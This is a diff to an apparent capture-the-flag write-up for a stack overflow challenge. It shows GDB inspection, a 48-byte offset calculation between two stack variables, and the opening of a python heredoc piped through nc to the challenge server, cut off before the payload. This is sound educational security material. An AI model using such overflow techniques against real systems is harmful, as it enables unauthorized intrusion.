@@ -35,6 +35,7 @@ void run_lottery(const char* prize) {
 }
 ```
 The goal is to overwrite prize so that it points to guess.
+
 2. Stack inspection with GDB
 Set a breakpoint:
 ```
@@ -52,7 +53,8 @@ Print the value of prize:
 print prize
 ```
 Ouput: `$2 = 0xffffc854 ")\250A.\"\236\020k"`
-3. Calculating the offset using the distance between guess and prize: `0xffffc854 - 0xffffc824 = 0x30 = 48 bytes`
+3. Calculating the offset using the distance between guess and prize: `0xffffc854 - 0xffffc824 = 0x30 = 48 bytes
+
 4. Send the payload to the challenge server having the little-endian system in consideration:
 ```bash
 python3 - << 'EOF' | nc mustard.stt.rnl.tecnico.ulisboa.pt 25161
